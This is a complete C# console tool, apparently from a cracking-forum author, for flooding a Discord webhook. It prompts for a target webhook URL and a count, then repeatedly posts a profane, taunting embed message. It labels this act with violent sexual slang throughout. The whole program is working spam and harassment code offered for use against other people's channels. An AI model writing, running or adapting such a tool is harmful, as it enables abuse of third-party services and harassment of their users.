using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Colorful;
using Leaf.xNet;
using System.Threading;
using System.Drawing;
using System.Threading.Tasks;

namespace DiscordWebhook_Raper
{
	class Program
	{

		public static int MSGSENT = 0;
		static void Main(string[] args)
		{
			Colorful.Console.Title = "BabiKoqi's Discord Webhook Raper - [Anarchy Team]";
			Colorful.Console.Write(@"

                    ▄ ▄   ▄███▄   ███    ▄  █ ████▄ ████▄ █  █▀     █▄▄▄▄ ██   █ ▄▄  ▄███▄   █▄▄▄▄ 
                   █   █  █▀   ▀  █  █  █   █ █   █ █   █ █▄█       █  ▄▀ █ █  █   █ █▀   ▀  █  ▄▀ 
                  █ ▄   █ ██▄▄    █ ▀ ▄ ██▀▀█ █   █ █   █ █▀▄       █▀▀▌  █▄▄█ █▀▀▀  ██▄▄    █▀▀▌  
                  █  █  █ █▄   ▄▀ █  ▄▀ █   █ ▀████ ▀████ █  █      █  █  █  █ █     █▄   ▄▀ █  █  
                   █ █ █  ▀███▀   ███      █                █         █      █  █    ▀███▀     █   
                    ▀ ▀                   ▀                ▀         ▀      █    ▀            ▀    
                                                                          ▀                       


", Color.Purple);
			Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
			Colorful.Console.Write("What Webhook Do You Want To Rape: ", Color.White);
			string hook = Colorful.Console.ReadLine();
			Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
			Colorful.Console.Write("How Many Times Do You Want To Send The Message: ", Color.White);
			int times = Convert.ToInt32(Colorful.Console.ReadLine());
			Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
			Colorful.Console.Write("Starting To Rape The Webhook...\n\n", Color.White);

			bool working = true;

			Task.Factory.StartNew(delegate ()
			{
				while (working)
			    {
					Colorful.Console.Title = $"BabiKoqi's Discord Webhook Raper - Msgs Sent:[{MSGSENT}] - [Anarchy Team]";
				}
			});

			for (int i = 0; i < times; i++)
			{
				try
				{
					using (HttpRequest req = new HttpRequest())
					{
						string request = req.Post(hook, "{\"username\":\"BabiKoqi's Slave\",\"embeds\":[{\"title\":\"You Got Fucked By BabiKoqi!! Enjoy⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\",\"type\":\"rich\",\"color\":\"4194432\",\"footer\":{\"text\":\"Enjoy These Spams By BabiKoqi!!\"},\"author\":{\"name\":\"BabiKoqi\",\"icon_url\":\"https://i.imgur.com/Y81Ia57.jpg\",\"url\":\"https://cracked.to/member.php?action=profile&uid=118633\"},\"fields\":[{\"name\":\"Get Fucked\",\"value\":\"Anarchy Team\",\"inline\":true},{\"name\":\"Get Fucked\",\"value\":\"Anarchy Team\",\"inline\":true}]}]}", "application/json").ToString();
						Thread.Sleep(100);
					}
				}
				catch
				{

				}
				MSGSENT++;
				Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
				Colorful.Console.WriteLine($"Message Number [{MSGSENT}] Was Sent.", Color.White);
			}
			Colorful.Console.Write("\n\n");
			Colorful.Console.Write(DateTime.Now.ToString("[HH:mm:ss]> "), Color.LimeGreen);
			Colorful.Console.Write("Program Finished Its Work...");
			Colorful.Console.ReadLine();

		}
	}
}
